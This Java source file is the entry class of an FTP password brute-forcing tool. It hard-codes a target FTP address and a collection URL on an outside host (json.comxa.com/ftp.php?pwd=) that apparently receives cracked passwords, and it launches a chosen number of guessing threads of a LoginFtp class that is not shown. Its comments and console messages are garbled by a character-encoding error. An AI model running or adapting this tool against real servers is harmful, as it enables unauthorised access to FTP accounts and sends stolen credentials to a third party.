public class Main
{
	// Ŀ��FTP��IP��ַ
	public static final String FTP_ADDRESS = "192.168.164.68";
	// Ŀ��FTP�Ķ˿�
	public static final int FTP_PORT = 21;
	// ������շ�����
	public static final String SUBMIT_ADDRESS = "http://json.comxa.com/ftp.php?pwd=";

	// java Main
	public static void main(String[] args)
	{
		if (args.length != 2)
		{
			System.out.println("û��ָ������λ�����߳�����");
			printDoc();
			return;
		}
		else if (!isNumber(args[0]))
		{
			System.out.println("ָ��ָ������λ����������");
			printDoc();
			return;
		}
		else if (!isNumber(args[1]))
		{
			System.out.println("ָ��ָ���߳�������������");
			printDoc();
			return;
		}
		else
		{
			int numPwd = Integer.parseInt(args[0]);
			int threadNum = Integer.parseInt(args[1]);
			System.out.println("����λ��:" + numPwd + ",�߳�����:" + threadNum);
			System.out.println("5���ʼ");
			for (int i = 5; i >= 0; i--)
			{
				System.out.println(i);
				try
				{
					Thread.sleep(1000);
				}
				catch (InterruptedException e)
				{
				}
			}
			for (int i = 0; i < threadNum; i++)
				new LoginFtp(numPwd).start();
		}
	}

	static void printDoc()
	{
		System.out.println("ʹ��:java Main ����λ�� �߳�����");
	}

	static boolean isNumber(String numStr)
	{
		try
		{
			Integer.parseInt(numStr);
		}
		catch (Exception e)
		{
			return false;
		}
		return true;
	}
}
